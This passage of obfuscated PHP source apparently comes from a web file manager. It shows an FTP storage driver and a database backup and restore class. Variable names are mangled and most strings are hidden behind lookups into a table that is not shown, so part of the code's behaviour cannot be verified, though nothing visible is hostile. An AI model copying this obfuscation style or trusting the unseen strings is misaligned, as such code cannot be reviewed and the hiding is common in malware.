delFile($Ş£ÁšÓè) { if (!$this->_isconn()) { return !1; } $Ş£ÁšÓè = $this->iconvSystem($Ş£ÁšÓè); $ßä“Ò«¬ = @ftp_delete($this->connect, $Ş£ÁšÓè); if (!$ßä“Ò«¬) { $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][1450], !0); } return $ßä“Ò«¬; } public function delFolder($Ğóê½Ê) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $úö“ŠÊä = $É·†İá¡ = array(); $this->fileList($Ğóê½Ê, $úö“ŠÊä, $É·†İá¡, !0); $this->listItemCache = !0; foreach ($É·†İá¡ as $¶ÀÎúŠà) { $æ¥ŸöğÉ = $this->iconvSystem($¶ÀÎúŠà[$_SERVER[´È¥ö†ö][32]]); $Ê©ú¨úª = @ftp_delete($this->connect, $æ¥ŸöğÉ); if (!$Ê©ú¨úª) { return !1; } } foreach ($úö“ŠÊä as $æ¥ŸöğÉ) { $æ¥ŸöğÉ = $this->iconvSystem($æ¥ŸöğÉ); $Ê©ú¨úª = @ftp_rmdir($this->connect, $æ¥ŸöğÉ); if (!$Ê©ú¨úª) { return !1; } } $Ğóê½Ê = $this->iconvSystem($Ğóê½Ê); return @ftp_rmdir($this->connect, $Ğóê½Ê); } public function rename($§ŞÌ¸, $Æñ«×°¯) { $Óë‰öõ˜ =& $_SERVER[´È¥ö†ö]; if (!$this->_isconn()) { return !1; } $›¢Ë¶ø“ = $this->fileNameAuto($this->pathFather($§ŞÌ¸), $Æñ«×°¯); $›¢Ë¶ø“ = $this->iconvSystem($›¢Ë¶ø“); $§ŞÌ¸ = $this->iconvSystem($§ŞÌ¸); $ê²ÂèŸ… = $this->pathFather($§ŞÌ¸); $¦—‰Š = rtrim($ê²ÂèŸ…, $Óë‰öõ˜[8]) . $Óë‰öõ˜[8] . $›¢Ë¶ø“; $×ŸÌø»Ç = @ftp_rename($this->connect, $§ŞÌ¸, $¦—‰Š); if (!$×ŸÌø»Ç) { $this->writeLog(__FUNCTION__ . $Óë‰öõ˜[1450], !0); return !1; } $¦—‰Š = $this->iconvApp($¦—‰Š); return $this->getPathOuter($¦—‰Š); } private function folderInfo($¨Éù—û¸, $˜“§‘À = false) { $—æèŒÇ’ =& $_SERVER[´È¥ö†ö]; $•ç·€Şà = array($—æèŒÇ’[32] => $this->pathThis($¨Éù—û¸), $—æèŒÇ’[87] => $this->getPathOuter($—æèŒÇ’[8] . $¨Éù—û¸), $—æèŒÇ’[33] => $—æèŒÇ’[78]); if ($˜“§‘À) { return $•ç·€Şà; } $•ç·€Şà[$—æèŒÇ’[233]] = $•ç·€Şà[$—æèŒÇ’[88]] = 0; $•ç·€Şà[$—æèŒÇ’[234]] = $•ç·€Şà[$—æèŒÇ’[235]] = !0; return $•ç·€Şà; } private function fileInfo($Û…é”Ş, $óá«œ = false, $Íª¦İüÜ = array()) { $ØÛµ€æ =& $_SERVER[´È¥ö†ö]; $§ÜÆ¢ëÃ = array($ØÛµ€æ[32] => $this->pathThis($Û…é”Ş), $ØÛµ€æ[87] => $this->getPathOuter($ØÛµ€æ[8] . $Û…é”Ş), $ØÛµ€æ[33] => $ØÛµ€æ[232], $ØÛµ€æ[79] => isset($Íª¦İüÜ[$ØÛµ€æ[79]]) ? $Íª¦İüÜ[$ØÛµ€æ[79]] : 0, $ØÛµ€æ[169] => $this->ext($Û…é”Ş)); if ($óá«œ) { return $§ÜÆ¢ëÃ; } $§ÜÆ¢ëÃ[$ØÛµ€æ[233]] = $§ÜÆ¢ëÃ[$ØÛµ€æ[88]] = 0; $§ÜÆ¢ëÃ[$ØÛµ€æ[234]] = $§ÜÆ¢ëÃ[$ØÛµ€æ[235]] = !0; $ÉÚüàú‘ = $this->iconvSystem($Û…é”Ş); $§ÜÆ¢ëÃ[$ØÛµ€æ[88]] = @ftp_mdtm($this->connect, $ÉÚüàú‘); if (empty($Íª¦İüÜ)) { $Íª¦İüÜ = $this->objectMeta($Û…é”Ş); if (!$Íª¦İüÜ) { return $§ÜÆ¢ëÃ; } } $§ÜÆ¢ëÃ[$ØÛµ€æ[79]] = $Íª¦İüÜ[$ØÛµ€æ[79]]; return $§ÜÆ¢ëÃ; } public function size($ŠêÍÅñ·) { $æ¢®«¦™ = $this->objectMeta($ŠêÍÅñ·); return $æ¢®«¦™ ? $æ¢®«¦™[$_SERVER[´È¥ö†ö][79]] : 0; } public function info($Å¯î½ôÒ) { if ($this->isFile($Å¯î½ôÒ)) { return $this->fileInfo($Å¯î½ôÒ, 0); } else { if ($this->isFolder($Å¯î½ôÒ)) { return $this->folderInfo($Å¯î½ôÒ); } } return !1; } private function fileList($™¤›¼ğ, &$Í¼âÏ, &$‰‚ª­÷, $Îä¦€¿ = false) { $ô—­ê¦¥ =& $_SERVER[´È¥ö†ö]; $™¤›¼ğ = $this->iconvSystem($™¤›¼ğ); if (!$this->isFolder($™¤›¼ğ)) { return !1; } @ftp_chdir($this->connect, $ô—­ê¦¥[8]); $™¤›¼ğ = rtrim($™¤›¼ğ, $ô—­ê¦¥[8]) . $ô—­ê¦¥[8]; check_abort(); $æÑ¸ûØĞ = @ftp_rawlist($this->connect, $™¤›¼ğ); if (!$æÑ¸ûØĞ) { $æÑ¸ûØĞ = array(); } $Šƒ¯Î¹‡ = array($ô—­ê¦¥[10] => 1, $ô—­ê¦¥[1362] => 1); foreach ($æÑ¸ûØĞ as $´ŠÒã÷) { $ô›Ê„÷¥ = $this->_listItem($´ŠÒã÷); if ($ô›Ê„÷¥[0] == $ô—­ê¦¥[834]) { continue; } $•­µØ‰ = $ô›Ê„÷¥[8]; if (empty($•­µØ‰) && $•­µØ‰ !== $ô—­ê¦¥[230] || isset($Šƒ¯Î¹‡[$•­µØ‰])) { continue; } $•­µØ‰ = $this->iconvApp($™¤›¼ğ . ltrim($•­µØ‰, $ô—­ê¦¥[8])); $ŸÓ°º¶ = array($ô—­ê¦¥[32] => $•­µØ‰, $ô—­ê¦¥[33] => $ô—­ê¦¥[232], $ô—­ê¦¥[79] => $ô›Ê„÷¥[4]); if (substr($´ŠÒã÷, 0, 1) == $ô—­ê¦¥[1451]) { $ŸÓ°º¶[$ô—­ê¦¥[33]] = $ô—­ê¦¥[78]; $ŸÓ°º¶[$ô—­ê¦¥[79]] = 0; } $Ä®¦ÃÚ† = $ŸÓ°º¶[$ô—­ê¦¥[33]] == $ô—­ê¦¥[78] ? !0 : !1; $this->cacheMethodInfoSet($•­µØ‰, $Ä®¦ÃÚ†, $ŸÓ°º¶); if ($Ä®¦ÃÚ†) { $Í¼âÏ[] = $•­µØ‰; if ($Îä¦€¿) { $this->fileList($•­µØ‰, $Í¼âÏ, $‰‚ª­÷, $Îä¦€¿); } continue; } $‰‚ª­÷[] = $ŸÓ°º¶; } $this->cacheMethodInfoSet($™¤›¼ğ, !0); } private function _listItem($•öìÂãÃ) { if (empty($•öìÂãÃ)) { return array(); } $ì–óøå = preg_split($_SERVER[´È¥ö†ö][1452], $•öìÂãÃ); if (count($ì–óøå) <= 9) { return $ì–óøå; } $ì–óøå[8] = trim(substr($•öìÂãÃ, strpos($•öìÂãÃ, $ì–óøå[7]) + strlen($ì–óøå[7]))); return array_splice($ì–óøå, 0, 9); } public function listPath($¤¹åæËå, $°¸Øè½â = false) { $åÓ¾­öŸ =& $_SERVER[´È¥ö†ö]; if (!$this->_isconn()) { return !1; } $Í•µ´¨ = $äÎ¢Ù‰ = array(); $this->fileList($¤¹åæËå, $Í•µ´¨, $äÎ¢Ù‰); foreach ($Í•µ´¨ as $¿§‚‘ˆÂ => $ŒÀÔû’) { $Í•µ´¨[$¿§‚‘ˆÂ] = $this->folderInfo($ŒÀÔû’, $°¸Øè½â); } foreach ($äÎ¢Ù‰ as $¿§‚‘ˆÂ => $ŒÀÔû’) { $äÎ¢Ù‰[$¿§‚‘ˆÂ] = $this->fileInfo($ŒÀÔû’[$åÓ¾­öŸ[32]], $°¸Øè½â, $ŒÀÔû’); } return array($åÓ¾­öŸ[85] => $Í•µ´¨, $åÓ¾­öŸ[86] => $äÎ¢Ù‰); } public function has($¸‰Ù¼öé, $ŸòÒ€òä = false, $ÂÙ½í­ = true) { $–ñŞ«¨ =& $_SERVER[´È¥ö†ö]; $³ù½—È = $ı×Áá÷Ë = array(); $„†İÌ¨© = $ŸòÒ€òä ? !0 : !1; $this->fileList($¸‰Ù¼öé, $³ù½—È, $ı×Áá÷Ë, $„†İÌ¨©); if ($ŸòÒ€òä) { return array($–ñŞ«¨[241] => count($ı×Áá÷Ë), $–ñŞ«¨[242] => count($³ù½—È)); } if ($ÂÙ½í­) { if (count($ı×Áá÷Ë)) { return !0; } } else { if (count($³ù½—È)) { return !0; } } return !1; } public function listAll($üÖëÕ¬ß) { $øğß¯Œ– =& $_SERVER[´È¥ö†ö]; if (!$this->_isconn()) { return !1; } $¬ÁÀË•¡ = $¸´‰Ãû€ = array(); $this->fileList($üÖëÕ¬ß, $¬ÁÀË•¡, $¸´‰Ãû€, !0); $¶€òÁÚª = array_to_keyvalue($¸´‰Ãû€, $øğß¯Œ–[32]); foreach ($¬ÁÀË•¡ as $¥¤àÙÊ) { if (is_string($¥¤àÙÊ)) { $¶€òÁÚª[$¥¤àÙÊ] = array($øğß¯Œ–[79] => 0); } } return $this->listAllFiles($üÖëÕ¬ß, $¶€òÁÚª); } public function getContent($Á‡²ö«Õ) { if (!$this->_isconn()) { return !1; } $Á‡²ö«Õ = $this->iconvSystem($Á‡²ö«Õ); return $this->fileSubstr($Á‡²ö«Õ); } public function setContent($´Ú‡Œíä, $ì­¤“ª‰ = '') { if (!$this->_isconn()) { return !1; } $×ÅÛßˆ¼ = $this->pathThis($this->iconvSystem($´Ú‡Œíä)); $ÙÔéùšÁ = $this->tempFile($×ÅÛßˆ¼); file_put_contents($ÙÔéùšÁ, $ì­¤“ª‰); $­¿¾Ö¯ = $this->upload($´Ú‡Œíä, $this->iconvApp($ÙÔéùšÁ)); $this->tempFileRemve($ÙÔéùšÁ); return $­¿¾Ö¯; } public function fileSubstr($ñ½¤õóÄ, $æÏĞÖ° = 0, $Ê´–®¨ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ñ½¤õóÄ, $æÏĞÖ°, $Ê´–®¨); } private function ftpRequest($Ñà¶íĞ, $íæôº¹ = 0, $ú·Ë©¿ü = false) { $Ñà¶íĞ = $this->iconvSystem($Ñà¶íĞ); $Ú—ØãŠŞ = $this->scheme . $this->host . $_SERVER[´È¥ö†ö][4] . $this->port; $öæŒ›ÙØ = curl_init(); curl_setopt($öæŒ›ÙØ, CURLOPT_URL, $Ú—ØãŠŞ . $this->pathEncode($Ñà¶íĞ)); curl_setopt($öæŒ›ÙØ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ú·Ë©¿ü) { $ú®¥ñŒ = $íæôº¹ + $ú·Ë©¿ü - 1; curl_setopt($öæŒ›ÙØ, CURLOPT_RANGE, "{$íæôº¹}\55{$ú®¥ñŒ}"); } curl_setopt($öæŒ›ÙØ, CURLOPT_RETURNTRANSFER, 1); $œ‚Û°€š = curl_exec($öæŒ›ÙØ); curl_close($öæŒ›ÙØ); return $œ‚Û°€š; } public function upload($§ÑèÌ˜š, $½å¼£¥, $ÂñÖùŒ = false, $ßª±’™÷ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($§ÑèÌ˜š))) { return !1; } $§ÑèÌ˜š = $this->iconvSystem($§ÑèÌ˜š); $½å¼£¥ = $this->iconvSystem($½å¼£¥); $ë÷·ÂîÛ = ftp_nb_put($this->connect, $§ÑèÌ˜š, $½å¼£¥, FTP_BINARY); while ($ë÷·ÂîÛ == FTP_MOREDATA) { $ë÷·ÂîÛ = ftp_nb_continue($this->connect); } if ($ë÷·ÂîÛ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][1450], !0); return !1; } return $this->getPathOuter($§ÑèÌ˜š); } public function download($ÉŠ˜ÓÏÛ, $Ä®¯ë©× = '') { if (!$this->_isconn()) { return !1; } $¦ë§ÓèÛ = $this->pathFather($Ä®¯ë©×); if (!IO::mkdir($¦ë§ÓèÛ)) { return !1; } $ÉŠ˜ÓÏÛ = $this->iconvSystem($ÉŠ˜ÓÏÛ); $Ä®¯ë©× = $this->iconvSystem($Ä®¯ë©×); $å»ïú˜Å = ftp_nb_get($this->connect, $Ä®¯ë©×, $ÉŠ˜ÓÏÛ, FTP_BINARY); while ($å»ïú˜Å == FTP_MOREDATA) { $å»ïú˜Å = ftp_nb_continue($this->connect); } if ($å»ïú˜Å != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][1450], !0); return !1; } return $this->iconvApp($Ä®¯ë©×); } public function exist($¥ÄÃÑÕ£) { return $this->isFile($¥ÄÃÑÕ£) || $this->isFolder($¥ÄÃÑÕ£); } public function isFile($éÌîÛè) { return !$this->isFolder($éÌîÛè) && $this->objectMeta($éÌîÛè); } public function isFolder($Ğî–îÄ) { return $this->cacheMethod($_SERVER[´È¥ö†ö][179], $Ğî–îÄ); } protected function objectMeta($£‡Ê¾İ“) { return $this->cacheMethod($_SERVER[´È¥ö†ö][181], $£‡Ê¾İ“); } protected function _objectMeta($ú´Á¿ŠÜ) { $ö÷ÖÖ¤ =& $_SERVER[´È¥ö†ö]; if ($ú´Á¿ŠÜ == $ö÷ÖÖ¤[12] || $ú´Á¿ŠÜ == $ö÷ÖÖ¤[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ú´Á¿ŠÜ = $this->iconvSystem($ú´Á¿ŠÜ); $­Àêå˜¯ = array($ö÷ÖÖ¤[32] => $this->iconvApp($ú´Á¿ŠÜ), $ö÷ÖÖ¤[33] => $ö÷ÖÖ¤[232], $ö÷ÖÖ¤[79] => 0); @ftp_chdir($this->connect, $ö÷ÖÖ¤[8]); $°Îªôº = @ftp_size($this->connect, $ú´Á¿ŠÜ); if ($°Îªôº != -1) { $­Àêå˜¯[$ö÷ÖÖ¤[79]] = $°Îªôº; } else { $–£ÎÆ± = @ftp_chdir($this->connect, $ú´Á¿ŠÜ); if (!$–£ÎÆ±) { return !1; } $­Àêå˜¯[$ö÷ÖÖ¤[33]] = $ö÷ÖÖ¤[78]; } return $­Àêå˜¯; } protected function _isFolder($üÑ‹Å) { $›åßìñ =& $_SERVER[´È¥ö†ö]; if ($üÑ‹Å == $›åßìñ[12] || $üÑ‹Å == $›åßìñ[8]) { return !0; } $›²†à÷Ò = $this->_objectMeta($üÑ‹Å); return isset($›²†à÷Ò[$›åßìñ[33]]) && $›²†à÷Ò[$›åßìñ[33]] == $›åßìñ[78] ? !0 : !1; } } goto B‹Ëæîí“¶; d•„ˆµ¶Ô: class DbManage { function __construct($á­ æò‚ = array()) { $Š¾òÜ½ =& $_SERVER[´È¥ö†ö]; if (empty($á­ æò‚)) { $á­ æò‚ = $GLOBALS[$Š¾òÜ½[6]][$Š¾òÜ½[21]]; } $this->database = $á­ æò‚; } public function model($âÍ‡ğÜí = '') { return new ModelBase($âÍ‡ğÜí, $_SERVER[´È¥ö†ö][12], $this->database); } public function db($Îâ¡ºå· = false) { $Ç»‘Áú¨ =& $_SERVER[´È¥ö†ö]; $µ¥®’‚Š = array_change_key_case($this->database); if ($this->dbType() == $Ç»‘Áú¨[13] || !$Îâ¡ºå·) { return $this->model()->db(); } $Ó“Ü÷Ï„ = $µ¥®’‚Š[$Ç»‘Áú¨[1048]]; $µ¥®’‚Š[$Ç»‘Áú¨[1048]] = $Ç»‘Áú¨[12]; if ($µ¥®’‚Š[$Ç»‘Áú¨[1043]] == $Ç»‘Áú¨[1040]) { $ğášï°µ = $µ¥®’‚Š[$Ç»‘Áú¨[1049]]; $µ¥®’‚Š[$Ç»‘Áú¨[1049]] = substr($ğášï°µ, 0, strrpos($ğášï°µ, $Ç»‘Áú¨[1135])); } $this->database = $µ¥®’‚Š; $ä•˜™÷· = $this->model()->db(); try { $£ôƒ»÷ğ = $ä•˜™÷·->execute("\x73\150\x6f\167\40\x64\x61\x74\141\142\x61\x73\145\x73\40\x6c\x69\153\x65\40\47{$Ó“Ü÷Ï„}\47"); } catch (Exception $ı®ĞØ ê) { } if (!$£ôƒ»÷ğ) { $ä•˜™÷·->execute("\143\x72\x65\141\164\x65\x20\x64\x61\x74\x61\x62\x61\163\145\40\x60{$Ó“Ü÷Ï„}\140"); } $µ¥®’‚Š[$Ç»‘Áú¨[1048]] = $Ó“Ü÷Ï„; if ($µ¥®’‚Š[$Ç»‘Áú¨[1043]] == $Ç»‘Áú¨[1040]) { $µ¥®’‚Š[$Ç»‘Áú¨[1049]] .= $Ç»‘Áú¨[1135] . $Ó“Ü÷Ï„; } $this->database = $µ¥®’‚Š; $ä•˜™÷·->execute("\x75\x73\145\x20\x60{$Ó“Ü÷Ï„}\140"); return $ä•˜™÷·; } public function createTable($¸¶£‘«, &$±‘–»Û ) { $ Ø™Òèœ =& $_SERVER[´È¥ö†ö]; if (!IO::exist($¸¶£‘«)) { ActionCall($ Ø™Òèœ[1136], !0, 0); show_json(LNG($ Ø™Òèœ[1137]), !1); } $ ”‰¶¹¢ = $this->model()->db(); $©¼¯ÅÈ’ = sqlSplit(IO::getContent($¸¶£‘«)); foreach ($©¼¯ÅÈ’ as $º„ÇÛÇ©) { $×Ã¾ıŞï = stripos($º„ÇÛÇ©, $ Ø™Òèœ[1138]) === 0; if ($×Ã¾ıŞï) { $±‘–»Û ->task[$ Ø™Òèœ[1139]] += 1; } $ ”‰¶¹¢->execute($º„ÇÛÇ©); if ($×Ã¾ıŞï) { preg_match($ Ø™Òèœ[1140], $º„ÇÛÇ©, $ü¿æø´Ú); $±‘–»Û ->task[$ Ø™Òèœ[1141]] = $ü¿æø´Ú[1]; $±‘–»Û ->update(1); } } } public function insertTable($á°Îêñİ, &$·ìíƒçµ) { $òí÷Üá =& $_SERVER[´È¥ö†ö]; $éÇï°‘ = $this->model()->db(); $µÓµî¹­ = $¬œâšÒÆ ? array($¬œâšÒÆ) : $éÇï°‘->getTables(); foreach ($á°Îêñİ as $õ€½é¯Ö) { $¬œâšÒÆ = basename($õ€½é¯Ö, $òí÷Üá[865]); if (!in_array($¬œâšÒÆ, $µÓµî¹­)) { continue; } $·ìíƒçµ->task[$òí÷Üá[1141]] = $¬œâšÒÆ; if (get_filesize($õ€½é¯Ö) == 0) { continue; } $­•–§– = $this->sqlToDb($õ€½é¯Ö, $·ìíƒçµ); if (!$­•–§–) { ActionCall($òí÷Üá[1136], !0, 0); show_json(LNG($òí÷Üá[1142]) . "\133{$¬œâšÒÆ}\135", !1); } } } public function sqlFromDb($É”§Âşµ, $ó÷î¨ãÅ, &$¬Äİ®¼, $°–ß‹Ú» = '') { if ($¬Äİ®¼) { $¬Äİ®¼->task[$_SERVER[´È¥ö†ö][1141]] = $É”§Âşµ; } $›€Òâ€û = $this->model($É”§Âşµ); $¶ÂŠˆíŠ = 0; $ƒïÉó° = 0; $›²èÁ‰ç = 10000; $ãÖ‘€á¡ = fopen($ó÷î¨ãÅ, $_SERVER[´È¥ö†ö][1143]); $Î€ˆáâè = $›€Òâ€û->getPk(); $ùŒ÷ø¢± = $›€Òâ€û->getDbFields(); $·Ç¿–ë— = $_SERVER[´È¥ö†ö][12]; if ($GLOBALS[$_SERVER[´È¥ö†ö][864]] && in_array($É”§Âşµ, array($_SERVER[´È¥ö†ö][1144], $_SERVER[´È¥ö†ö][1145]))) { $·Ç¿–ë— = $É”§Âşµ; } do { $™êúã§¾ = array($Î€ˆáâè => array($_SERVER[´È¥ö†ö][1090], $ƒïÉó°)); $ô’…—¯¢ = $›€Òâ€û->where($™êúã§¾)->field($ùŒ÷ø¢±)->order($Î€ˆáâè . $_SERVER[´È¥ö†ö][1146])->limit($›²èÁ‰ç)->select(); $ô’…—¯¢ = !empty($ô’…—¯¢) ? $ô’…—¯¢ : array(); if (!($“Ò¥•ê¬ = count($ô’…—¯¢))) { break; } $ò…‡ÄãÔ = end($ô’…—¯¢); $ƒïÉó° = $ò…‡ÄãÔ[$Î€ˆáâè]; $ÜÕŞªÅ = array(); foreach ($ô’…—¯¢ as $­µêŞôğ) { if ($·Ç¿–ë—) { if ($É”§Âşµ == $_SERVER[´È¥ö†ö][1144]) { if ($­µêŞôğ[$_SERVER[´È¥ö†ö][33]] == $_SERVER[´È¥ö†ö][1147]) { $²ûüƒßŠ = json_decode($­µêŞôğ[$_SERVER[´È¥ö†ö][461]], !0); if ($²ûüƒßŠ[$_SERVER[´È¥ö†ö][32]] == $GLOBALS[$_SERVER[´È¥ö†ö][864]] && $²ûüƒßŠ[$_SERVER[´È¥ö†ö][826]] != 1) { continue; } } } else { if ($­µêŞôğ[$_SERVER[´È¥ö†ö][33]] == $_SERVER[´È¥ö†ö][1148] && $­µêŞôğ[$_SERVER[´È¥ö†ö][97]] == $_SERVER[´È¥ö†ö][859]) { continue; } } } if ($°–ß‹Ú») { $­µêŞôğ[$_SERVER[´È¥ö†ö][87]] = "\173\x69\x6f\72{$°–ß‹Ú»}\175" . substr($­µêŞôğ[$_SERVER[´È¥ö†ö][87]], strlen("\x7b\151\x6f\72{$­µêŞôğ[$_SERVER[´È¥ö†ö][894]]}\x7d")); $­µêŞôğ[$_SERVER[´È¥ö†ö][894]] = $°–ß‹Ú»; } $ÜÕŞªÅ[] = $_SERVER[´È¥ö†ö][1149] . $this->sqlEncode($­µêŞôğ) . $_SERVER[´È¥ö†ö][1150]; } $’ ÄÒÇÌ = "\x49\116\x53\105\x52\x54\40\x49\116\x54\x4f\40\140{$É”§Âşµ}\x60\40\50\140" . implode($_SERVER[´È¥ö†ö][1151], $ùŒ÷ø¢±) . $_SERVER[´È¥ö†ö][1152]; fwrite($ãÖ‘€á¡, $’ ÄÒÇÌ . implode($_SERVER[´È¥ö†ö][1153], $ÜÕŞªÅ) . $_SERVER[´È¥ö†ö][74] . PHP_EOL); $¶ÂŠˆíŠ += $“Ò¥•ê¬; if ($¬Äİ®¼) { $¬Äİ®¼->update($“Ò¥•ê¬); } } while ($›²èÁ‰ç == $“Ò¥•ê¬); fclose($ãÖ‘€á¡); return $¶ÂŠˆíŠ; } public function sqlToDb($ğ¬–ıÔµ, &$¸í©’¿) { $ÒÈ¨ê¼® =& $_SERVER[´È¥ö†ö]; $ö¾ıéåœ = $this->model()->db(); $€œ·ÑÔ = @fopen($ğ¬–ıÔµ, $ÒÈ¨ê¼®[1154]); if (!$€œ·ÑÔ) { return !1; } $˜«êÒ‰€ = 0; $¤ƒŠ½˜… = $ÒÈ¨ê¼®[12]; $­º ¢¥“ = array(); $õŒ°ğÕ = $this->dbType(); $™¬Åıïª = $õŒ°ğÕ == $ÒÈ¨ê¼®[13] ? 500 : 2000; $ışäØÃÙ = basename($ğ¬–ıÔµ, $ÒÈ¨ê¼®[865]); $Âô€°™ = 0; $½€Š¼–² = 4194304; while (!feof($€œ·ÑÔ)) { $˜×¦­‰ = trim(fgets($€œ·ÑÔ)); if (!$˜×¦­‰) { continue; } $øê¾ŒÙ— = $this->sqlDecode($˜×¦­‰, $õŒ°ğÕ, $ışäØÃÙ); if (stripos($øê¾ŒÙ—, $ÒÈ¨ê¼®[441]) === 0) { if (!$¤ƒŠ½˜…) { $¤ƒŠ½˜… = $øê¾ŒÙ— . $ÒÈ¨ê¼®[53]; } continue; } if ($¸í©’¿) { $¸í©’¿->task[$ÒÈ¨ê¼®[1139]] += 1; } $˜«êÒ‰€++; $­º ¢¥“[] = rtrim(rtrim(trim($øê¾ŒÙ—), $ÒÈ¨ê¼®[50]), $ÒÈ¨ê¼®[74]); $å˜ô²’ = null; $²¼şœèÏ = strlen($øê¾ŒÙ—); $Âô€°™ += $²¼şœèÏ; $ıÇÄÖçú = strlen($¤ƒŠ½˜…) + $Âô€°™ + (count($­º ¢¥“) - 1); if ($ıÇÄÖçú >= $½€Š¼–²) { $å˜ô²’ = array_pop($­º ¢¥“); if ($˜«êÒ‰€ > 1) { $˜«êÒ‰€--; } } if ($˜«êÒ‰€ >= $™¬Åıïª || $å˜ô²’) { $øê¾ŒÙ— = $¤ƒŠ½˜… . implode($ÒÈ¨ê¼®[50], $­º ¢¥“); if (!$ö¾ıéåœ->execute($øê¾ŒÙ—)) { return !1; } if ($¸í©’¿) { $¸í©’¿->update($˜«êÒ‰€); } $­º ¢¥“ = array(); $˜«êÒ‰€ = 0; $Âô€°™ = 0; if ($å˜ô²’) { $­º ¢¥“ = array($å˜ô²’); $˜«êÒ‰€ = 1; $Âô€°™ = $²¼şœèÏ; } } } fclose($€œ·ÑÔ); if (!empty($­º ¢¥“)) { $øê¾ŒÙ— = $¤ƒŠ½˜… . implode($ÒÈ¨ê¼®[50], $­º ¢¥“); if (!$ö¾ıéåœ->execute($øê¾ŒÙ—)) { return !1; } if ($¸í©’¿) { $¸í©’¿->update($˜«êÒ‰€); } } return !0; } public function dropTable($„üó²¤¸ = null) { $æÀ“ŒÇ‹ = $this->model()->db(); $İ»úà‘Ÿ = $„üó²¤¸ ? array($„üó²¤¸) : $æÀ“ŒÇ‹->getTables(); if (!$İ»úà‘Ÿ) { return; } foreach ($İ»úà‘Ÿ as $„üó²¤¸) { if ($„üó²¤¸) { $„üó²¤¸ = strtolower($„üó²¤¸); } else { continue; } $æÀ“ŒÇ‹->execute("\144\x72\157\160\x20\x74\x61\142\154\145\x20\x69\146\x20\x65\x78\151\163\164\x73\40\140{$„üó²¤¸}\140"); } } private function sqlEncode($²üÆ©å³) { $µ‚‡®Íü =& $_SERVER[´È¥ö†ö]; $å¹¡àÏô = array(); foreach ($²üÆ©å³ as $Ò²Ü Úß) { if (is_array($Ò²Ü Úß)) { $Ò²Ü Úß = json_encode_force($Ò²Ü Úß); } $Ò²Ü Úß = addslashes($Ò²Ü Úß); $Ò²Ü Úß = str_replace(array($µ‚‡®Íü[1155], $µ‚‡®Íü[287], $µ‚‡®Íü[428]), array($µ‚‡®Íü[1156], $µ‚‡®Íü[1157], $µ‚‡®Íü[1158]), $Ò²Ü Úß); $å¹¡àÏô[] = $Ò²Ü Úß; } return $µ‚‡®Íü[58] . implode($µ‚‡®Íü[1159], $å¹¡àÏô) . $µ‚‡®Íü[58]; } private function sqlDecode($Êò»•êÓ, $ŸîÓ°¢è, $Œîş™¿ã = '') { $¹¨ßâ¡» =& $_SERVER[´È¥ö†ö]; $Êò»•êÓ = str_replace(array($¹¨ßâ¡»[1156], $¹¨ßâ¡»[1157], $¹¨ßâ¡»[1158]), array($¹¨ßâ¡»[1155], $¹¨ßâ¡»[287], $¹¨ßâ¡»[428]), $Êò»•êÓ); if ($ŸîÓ°¢è == $¹¨ßâ¡»[13]) { $Êò»•êÓ = str_ireplace($¹¨ßâ¡»[1160], $¹¨ßâ¡»[59], $Êò»•êÓ); $Êò»•êÓ = stripslashes($Êò»•êÓ); } return preg_replace($¹¨ßâ¡»[1161], $¹¨ßâ¡»[12], $Êò»•êÓ); if ($ŸîÓ°¢è == $¹¨ßâ¡»[13]) { return $Œîş™¿ã != $¹¨ßâ¡»[858] ? stripslashes($Êò»•êÓ) : $Êò»•êÓ; } if ($Œîş™¿ã == $¹¨ßâ¡»[858]) { $Êò»•êÓ = str_replace($¹¨ßâ¡»[1162], $¹¨ßâ¡»[121], stripslashes($Êò»•êÓ)); } return $Êò»•êÓ; } public function getSqlFile($‡ÄÃ¢„Ç = '') { $Ø²ø¢ö„ =& $_SERVER[´È¥ö†ö]; $—ïÙ§ğª = $this->dbType(!0); $üè™”Âç = CONTROLLER_DIR . "\x69\156\163\164\141\154\154\57\x64\x61\x74\x61\x2f{$—ïÙ§ğª}\x2e\163\x71\154"; $ıÌäÏÔã = file_get_contents($üè™”Âç); $¬ëœÒ = $Ø²ø¢ö„[1163] . ($—ïÙ§ğª == $Ø²ø¢ö„[881] ? $Ø²ø¢ö„[1164] : $Ø²ø¢ö„[1165]) . $Ø²ø¢ö„[1166]; preg_match_all($¬ëœÒ, $ıÌäÏÔã, $½¯àƒ¸Š); $‚Ùº–ÜŒ = $½¯àƒ¸Š[1]; $æ¾ö˜‘Ê = $this->model()->db(); $Ü÷ÓŠÔÎ = $æ¾ö˜‘Ê->getTables(); $Æéš›ƒ£ = TEMP_FILES . $Ø²ø¢ö„[1167] . date($Ø²ø¢ö„[261]) . $Ø²ø¢ö„[8]; del_dir($Æéš›ƒ£); mk_dir($Æéš›ƒ£); $òŸå·’” = $Æéš›ƒ£ . $Ø²ø¢ö„[1168]; $‡¶Ùï—û = $Æéš›ƒ£ . $Ø²ø¢ö„[1169]; $„šÃ¥®Ø = $—ïÙ§ğª == $Ø²ø¢ö„[13] ? $Ø²ø¢ö„[881] : $Ø²ø¢ö„[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\141\x6c\154\57\x64\x61\164\x61\x2f{$„šÃ¥®Ø}\x2e\x73\161\154", $Æéš›ƒ£); @touch($Æéš›ƒ£ . $—ïÙ§ğª . $Ø²ø¢ö„[865]); $â÷óÅŞ· = fopen($òŸå·’”, $Ø²ø¢ö„[1143]); $”¾„¯í = fopen($‡¶Ùï—û, $Ø²ø¢ö„[1143]); if ($—ïÙ§ğª == $Ø²ø¢ö„[13]) { $Ü÷ÓŠÔÎ = array_diff($Ü÷ÓŠÔÎ, array($Ø²ø¢ö„[856], $Ø²ø¢ö„[857])); $éí•ææ = array($Ø²ø¢ö„[1170], $Ø²ø¢ö„[1171], $Ø²ø¢ö„[1172]); fwrite($”¾„¯í, implode(PHP_EOL, $éí•ææ) . PHP_EOL . PHP_EOL); foreach ($Ü÷ÓŠÔÎ as $æŞ€¦Ü) { $åÕÜíÅš = $this->sqlFromSqlite($æŞ€¦Ü); if 